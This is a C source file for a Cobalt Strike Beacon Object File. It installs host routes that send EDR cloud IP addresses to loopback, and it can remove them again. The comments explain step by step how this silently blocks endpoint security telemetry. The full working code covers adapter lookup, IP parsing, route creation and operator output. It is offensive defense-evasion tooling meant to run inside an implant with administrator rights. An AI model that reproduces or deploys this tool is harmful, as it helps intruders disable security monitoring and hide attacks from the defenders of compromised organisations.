/*
 * null_route.bof.c — Beacon Object File
 *
 * PURPOSE
 * -------
 * Install host-specific (/32) IP blackhole routes pointing EDR cloud IP
 * addresses at 127.0.0.1 on the loopback interface. Any TCP/UDP packet
 * the EDR sends to those IPs is delivered to loopback — where no service
 * is listening — and immediately gets RST or ICMP port-unreachable.
 * No packet ever leaves the physical network interface.
 *
 * WHY THIS WORKS (routing layer)
 * --------------------------------
 * When the kernel's IP stack routes an outgoing packet, it performs a
 * longest-prefix-match lookup in the IPv4 forward table (the same table
 * exposed by "route print" and by IPHLPAPI's GetIpForwardTable).
 * A /32 host route (mask 255.255.255.255) is the most specific possible
 * match for a single IP address and therefore ALWAYS wins over any less
 * specific route (default gateway /0, subnet /24, etc.).
 *
 * Route we add:
 *   Destination: <EDR IP>/32
 *   Next hop:    127.0.0.1
 *   Interface:   loopback (IF index obtained at runtime)
 *   Metric:      1  (lowest, wins over any existing route to that IP)
 *
 * What happens to EDR traffic:
 *   EDR calls connect(sock, &sinEdrCloud, ...) → TCP SYN is built
 *   Routing lookup: /32 host route matches → "send to loopback"
 *   Loopback driver receives SYN for 127.0.0.1 → no socket bound there
 *   TCP stack sends RST → connect() returns WSAECONNREFUSED
 *   EDR telemetry upload fails. No packet reaches NIC.
 *
 * This technique covers EDR binaries that have the cloud IP hardcoded
 * (bypassing DNS entirely) and therefore complements NRPT sinkhole.
 *
 * LOOPBACK INTERFACE DISCOVERY
 * ----------------------------
 * We use GetAdaptersInfo() to enumerate all adapters and find the one
 * whose first IP address is 127.0.0.1. We use its Index field as
 * dwForwardIfIndex in the MIB_IPFORWARDROW.
 *
 * MODES
 * -----
 *   0 — ADD: install /32 blackhole routes for semicolon-separated IP list
 *   1 — REMOVE: delete /32 blackhole routes for semicolon-separated IP list
 *
 * COMPILATION
 * -----------
 *   mingw64:  x86_64-w64-mingw32-gcc -o null_route.x64.o -c null_route.bof.c -masm=intel
 *   MSVC:     cl /c /TC /GS- /Fonull_route.x64.obj null_route.bof.c
 *
 * beacon.h: https://github.com/trustedsec/CS-Situational-Awareness-BOF
 */

#ifdef __cplusplus
#error "Compile as C, not C++: use  gcc -c  or  cl /TC"
#endif

#include <windows.h>
#include <iphlpapi.h>
#include "beacon.h"

/* ─── Dynamic imports ────────────────────────────────────────────────────── */
DECLSPEC_IMPORT DWORD WINAPI IPHLPAPI$CreateIpForwardEntry(MIB_IPFORWARDROW*);
DECLSPEC_IMPORT DWORD WINAPI IPHLPAPI$DeleteIpForwardEntry(MIB_IPFORWARDROW*);
DECLSPEC_IMPORT DWORD WINAPI IPHLPAPI$GetAdaptersInfo(PIP_ADAPTER_INFO, PULONG);
DECLSPEC_IMPORT void* WINAPI KERNEL32$RtlMoveMemory(void*, const void*, SIZE_T);

/* RtlZeroMemory is a forwarder in kernel32 and not reliably exported on all
 * Windows builds. Use a volatile loop instead — avoids CRT and all DLL deps. */
static void ZeroMem(void* p, SIZE_T n) {
    volatile char* v = (volatile char*)p;
    SIZE_T i;
    for (i = 0; i < n; i++) v[i] = 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * HELPER FUNCTIONS
 * ═══════════════════════════════════════════════════════════════════════════ */

/* Inline wchar_t tokenizer — no CRT wcstok needed.
 * Splits on ';'. Modifies buffer in-place.                                   */
static wchar_t* WNextTok(wchar_t** cursor) {
    wchar_t* start = *cursor;
    if (!start || *start == L'\0') return NULL;
    while (*start == L';') start++;
    if (*start == L'\0') { *cursor = start; return NULL; }
    wchar_t* p = start;
    while (*p && *p != L';') p++;
    if (*p == L';') { *p = L'\0'; *cursor = p + 1; }
    else            { *cursor = p; }
    return start;
}

/* Append src into dst starting at position pos.
 * Returns updated pos. Never writes past dst[max-1].                        */
static int WAppend(wchar_t* dst, int pos, int max, const wchar_t* src) {
    while (*src && pos < max - 1) dst[pos++] = *src++;
    return pos;
}

/*
 * ParseIPv4 — convert wide dotted-decimal string to network-byte-order DWORD.
 * Implements inet_addr logic without CRT.
 *
 * Input:  L"52.183.20.1"
 * Output: *out = 0x0114B734  (52=0x34, 183=0xB7, 20=0x14, 1=0x01 in network order)
 *
 * Returns TRUE on success, FALSE if string is malformed.
 *
 * Algorithm:
 *   Parse four decimal octets separated by '.'.
 *   Store in network byte order: octet[0] in LSB of DWORD (byte 0),
 *   i.e. result = (o[0]) | (o[1]<<8) | (o[2]<<16) | (o[3]<<24).
 *   This matches Windows INADDR representation where 1.2.3.4 = 0x04030201.
 */
static BOOL ParseIPv4(const wchar_t* s, DWORD* out) {
    DWORD octets[4];
    int   octIdx = 0;
    DWORD acc    = 0;
    BOOL  gotDigit = FALSE;

    for (;;) {
        wchar_t c = *s++;
        if (c >= L'0' && c <= L'9') {
            acc = acc * 10 + (DWORD)(c - L'0');
            if (acc > 255) return FALSE;
            gotDigit = TRUE;
        } else if (c == L'.' || c == L'\0') {
            if (!gotDigit) return FALSE;
            if (octIdx >= 4) return FALSE;
            octets[octIdx++] = acc;
            acc      = 0;
            gotDigit = FALSE;
            if (c == L'\0') break;
        } else {
            return FALSE; /* non-digit, non-dot, non-null */
        }
    }

    if (octIdx != 4) return FALSE;

    /* Network byte order: byte 0 of IP goes to byte 0 (LSB) of DWORD */
    *out = (octets[3] << 24) | (octets[2] << 16) | (octets[1] << 8) | octets[0];
    return TRUE;
}

/*
 * GetLoopbackIfIndex — find the adapter whose first IP is 127.0.0.1.
 * Returns the adapter Index, or 1 as fallback if not found.
 *
 * GetAdaptersInfo uses a caller-supplied buffer. We first call with size=0
 * to get the required size, then call again with an appropriately sized
 * stack buffer (up to 8 KB — plenty for typical adapter counts).
 */
static DWORD GetLoopbackIfIndex(void) {
    ULONG bufSize = 0;
    DWORD ret = IPHLPAPI$GetAdaptersInfo(NULL, &bufSize);
    /* ret == ERROR_BUFFER_OVERFLOW means bufSize was filled in */
    if (ret != ERROR_BUFFER_OVERFLOW && ret != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR,
            "  [!] GetAdaptersInfo(size query) failed: %lu — using IF=1\n", ret);
        return 1;
    }

    /* Use stack buffer capped at 8 KB */
    BYTE stackBuf[8192];
    if (bufSize > sizeof(stackBuf)) bufSize = sizeof(stackBuf);
    ZeroMem(stackBuf, sizeof(stackBuf));

    ret = IPHLPAPI$GetAdaptersInfo((PIP_ADAPTER_INFO)stackBuf, &bufSize);
    if (ret != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR,
            "  [!] GetAdaptersInfo failed: %lu — using IF=1\n", ret);
        return 1;
    }

    PIP_ADAPTER_INFO pAdapter = (PIP_ADAPTER_INFO)stackBuf;
    while (pAdapter) {
        /* IpAddressList is a linked list of IP_ADDR_STRING; check first entry */
        const char* ip = pAdapter->IpAddressList.IpAddress.String;
        /* Compare with "127.0.0.1" without CRT strcmp */
        const char* needle = "127.0.0.1";
        BOOL match = TRUE;
        int j;
        for (j = 0; needle[j]; j++) {
            if (ip[j] != needle[j]) { match = FALSE; break; }
        }
        if (match && ip[j] == '\0') {
            return pAdapter->Index;
        }
        pAdapter = pAdapter->Next;
    }

    BeaconPrintf(CALLBACK_ERROR,
        "  [!] Loopback adapter not found — using IF=1\n");
    return 1;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * ROUTE OPERATIONS
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * BuildRow — fill MIB_IPFORWARDROW for a /32 blackhole route.
 *
 * dwForwardNextHop = 0x0100007F = 127.0.0.1 in little-endian network order:
 *   byte 0 = 127 = 0x7F
 *   byte 1 =   0 = 0x00
 *   byte 2 =   0 = 0x00
 *   byte 3 =   1 = 0x01
 *   DWORD  = 0x0100007F
 *
 * dwForwardType = 4 = MIB_IPROUTE_TYPE_INDIRECT (next hop is a router, not on-link)
 * dwForwardProto = 3 = MIB_IPPROTO_NETMGMT (added by network management component)
 */
static void BuildRow(MIB_IPFORWARDROW* row, DWORD destIP, DWORD ifIdx) {
    ZeroMem(row, sizeof(MIB_IPFORWARDROW));
    row->dwForwardDest    = destIP;
    row->dwForwardMask    = 0xFFFFFFFF;     /* /32 host route */
    row->dwForwardPolicy  = 0;
    row->dwForwardNextHop = 0x0100007F;     /* 127.0.0.1 network byte order */
    row->dwForwardIfIndex = ifIdx;
    row->dwForwardType    = 4;              /* MIB_IPROUTE_TYPE_INDIRECT */
    row->dwForwardProto   = 3;              /* MIB_IPPROTO_NETMGMT */
    row->dwForwardAge     = 0;
    row->dwForwardMetric1 = 1;              /* lowest metric — always wins */
}

/* ═══════════════════════════════════════════════════════════════════════════
 * BOF ENTRY POINT
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * Argument format (packed by CNA with bof_pack("iZ", mode, ips)):
 *
 *   [int32] mode
 *     0 = add /32 blackhole routes for each IP in list
 *     1 = remove /32 blackhole routes for each IP in list
 *
 *   [wchar_t* Z] ips
 *     Semicolon-separated dotted-decimal IPv4 addresses, e.g.:
 *     "52.183.20.1;13.89.176.1;20.190.128.1"
 *
 * Privilege requirement: modifying the routing table requires Administrator
 * privileges (SeNetworkServicePrivilege or equivalent via SYSTEM token).
 */
void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    LONG     mode    = BeaconDataInt(&parser);
    int      argBytes = 0;
    wchar_t* rawArg  = (wchar_t*)BeaconDataExtract(&parser, &argBytes);

    wchar_t buf[2048];
    int i;
    for (i = 0; i < 2048; i++) buf[i] = L'\0';
    if (rawArg && argBytes > 2) {
        int n = argBytes / (int)sizeof(wchar_t);
        if (n >= 2048) n = 2047;
        KERNEL32$RtlMoveMemory(buf, rawArg, n * sizeof(wchar_t));
        buf[n] = L'\0';
    }

    if (!buf[0]) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] No IP list provided.\n"
            "    Usage: null_route 52.183.0.1;13.89.176.1\n");
        return;
    }

    /* Discover loopback interface index once */
    DWORD loopbackIdx = GetLoopbackIfIndex();

    /* Count IPs */
    wchar_t countBuf[2048];
    KERNEL32$RtlMoveMemory(countBuf, buf, sizeof(wchar_t) * 2047);
    countBuf[2047] = L'\0';
    int total = 0;
    wchar_t* cc = countBuf;
    while (WNextTok(&cc) != NULL) total++;

    if (mode == 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Null Route: adding blackhole routes for %d IP(s)...\n", total);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Null Route: removing blackhole routes for %d IP(s)...\n", total);
    }

    int ok = 0, fail = 0;
    wchar_t workBuf[2048];
    KERNEL32$RtlMoveMemory(workBuf, buf, sizeof(wchar_t) * 2047);
    workBuf[2047] = L'\0';
    wchar_t* cursor = workBuf;
    wchar_t* tok;

    while ((tok = WNextTok(&cursor)) != NULL) {
        DWORD destIP = 0;
        if (!ParseIPv4(tok, &destIP)) {
            BeaconPrintf(CALLBACK_ERROR,
                "  [-] '%S' — ParseIPv4 failed (invalid dotted-decimal)\n", tok);
            fail++;
            continue;
        }

        MIB_IPFORWARDROW row;
        BuildRow(&row, destIP, loopbackIdx);

        DWORD ret;
        if (mode == 0) {
            ret = IPHLPAPI$CreateIpForwardEntry(&row);
            if (ret == NO_ERROR) {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "  [+] %S/32 -> 127.0.0.1 (loopback IF=%lu)\n"
                    "      TCP SYN to this IP will get immediate RST — no packet leaves NIC\n",
                    tok, loopbackIdx);
                ok++;
            } else if (ret == ERROR_OBJECT_ALREADY_EXISTS) {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "  [=] %S/32 already exists (skipping)\n", tok);
                ok++;
            } else {
                BeaconPrintf(CALLBACK_ERROR,
                    "  [-] %S/32 — CreateIpForwardEntry failed: %lu\n", tok, ret);
                fail++;
            }
        } else {
            ret = IPHLPAPI$DeleteIpForwardEntry(&row);
            if (ret == NO_ERROR) {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "  [+] %S/32 route deleted\n", tok);
                ok++;
            } else if (ret == ERROR_NOT_FOUND) {
                BeaconPrintf(CALLBACK_ERROR,
                    "  [-] %S/32 — route not found (not installed?)\n", tok);
                fail++;
            } else {
                BeaconPrintf(CALLBACK_ERROR,
                    "  [-] %S/32 — DeleteIpForwardEntry failed: %lu\n", tok, ret);
                fail++;
            }
        }
    }

    const char* verb = (mode == 0) ? "routes added" : "routes removed";
    BeaconPrintf(ok == total ? CALLBACK_OUTPUT : CALLBACK_ERROR,
        "[*] RESULT: %d/%d %s\n",
        ok, total, verb);

    if (mode == 0 && ok > 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "    Verify: route print | findstr \"127.0.0.1\"\n"
            "    EDR cloud IPs are now blackholed via loopback\n");
    }
}
